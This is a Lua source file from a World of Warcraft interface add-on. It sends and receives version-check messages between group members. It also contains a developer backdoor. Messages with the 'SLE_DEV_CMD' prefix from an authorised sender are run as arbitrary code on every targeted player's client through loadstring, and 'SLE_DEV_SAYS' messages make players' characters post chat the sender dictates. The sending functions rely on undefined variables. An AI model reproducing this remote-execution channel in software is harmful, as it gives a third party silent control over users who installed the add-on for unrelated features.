local E, L, V, P, G, _ = unpack(ElvUI); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB
local SLE = E:GetModule('SLE');
local find = string.find
local split = string.split


function E:SendSLEMessage()
	local _, instanceType = IsInInstance()
	if IsInRaid() then
		SendAddonMessage("SLE_VERSION", SLE.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
	elseif IsInGroup() then
		SendAddonMessage("SLE_VERSION", SLE.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
	end
	
	if SLE.SendMSGTimer then
		E:CancelTimer(E.SendSLEMSGTimer)
		E.SendSLEMSGTimer = nil
	end
end

function E:sleSays(msg) -- /w Target /slesays {Target|ALL}#channel#message#whispertarget
	if not SLE:Auth() then return end
	if channel == 'WHISPER' and target == nil then
		E:Print('You need to set a whisper target.')
		return
	end
	SendAddonMessage('SLE_DEV_SAYS', msg, channel, target)
end

function E:sleCommand(msg) -- /w Target /slecmd {Target|ALL}#script
	if not SLE:Auth() then return end
	if channel == 'WHISPER' and target == nil then
		E:Print('You need to set a whisper target.')
		return
	end
	SendAddonMessage('SLE_DEV_CMD', msg, channel, target)
end

local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname then return end
		if SLE:Auth() then return end
		if prefix == "SLE_VERSION" and not SLE.recievedOutOfDateMessage then
			if SLE.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(SLE.version) then
				SLE:Print(L["Your version of ElvUI S&L is out of date. You can download the latest version from http://www.tukui.org"])
				SLE.recievedOutOfDateMessage = true
			end
		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and (SLE:CrossAuth(sender) or SLE:Auth()) then
			if prefix == 'SLE_DEV_SAYS' then
				local user, channel, msg, sendTo = split("#", message)
				
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					SendChatMessage(msg, channel, nil, sendTo)
				end
			else
				local user, executeString = split("#", message)
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					local func, err = loadstring(executeString);
					if not err then
						SLE:Print(format("Developer Executed: %s", executeString))
						func()
					end
				end			
			end
		end
	else
		E.SendSLEMSGTimer = E:ScheduleTimer('SendSLEMessage', 12)
	end
end

RegisterAddonMessagePrefix('SLE_VERSION')
RegisterAddonMessagePrefix('SLE_DEV_SAYS')
RegisterAddonMessagePrefix('SLE_DEV_CMD')

local f = CreateFrame('Frame', "DaFrame")
f:RegisterEvent("GROUP_ROSTER_UPDATE")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)

function SLE:RegisterCommands()
	E:RegisterChatCommand('slesays', 'sleSays')
	E:RegisterChatCommand('slecmd', 'sleCommand')
end
